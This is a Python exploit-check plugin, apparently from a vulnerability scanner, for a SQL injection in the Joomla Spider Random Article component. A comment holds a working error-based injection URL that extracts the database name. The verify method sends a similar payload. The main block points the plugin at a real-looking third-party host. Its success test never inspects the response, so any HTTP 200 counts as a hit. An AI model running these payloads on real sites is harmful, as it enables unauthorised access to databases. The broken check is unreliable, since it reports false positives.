from ..miniCurl import Curl
from ..t  import T
#__author__ = 'ning-pc'
#title Joomla Spider Random Article SQL Injection
# PoC  /index.php?option=com_rand&catID=1' and(select 1 FROM(select count(*),concat((select (select concat(database(),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -&limit=1&style=1&view=articles&format=raw&Itemid=13


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'index.php?option=com_rand&catID=1%27%20and(select%201%20FROM(select%20count(*),concat((select%20(select%20concat(md5(1),0x27,0x7e))%20FROM%20information_schema.tables%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)--%20-&limit=1&style=1&view=articles&format=raw&Itemid=13'
        verify_url = arg+payload
        code, head, res, errcode, _ = curl.curl2(verify_url)
        if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b':
            output(verify_url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_43e197b39d04da26a8db29a11e20ba37.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_43e197b39d04da26a8db29a11e20ba37.py
#/root/github/poccreate/codesrc/exp-2478.py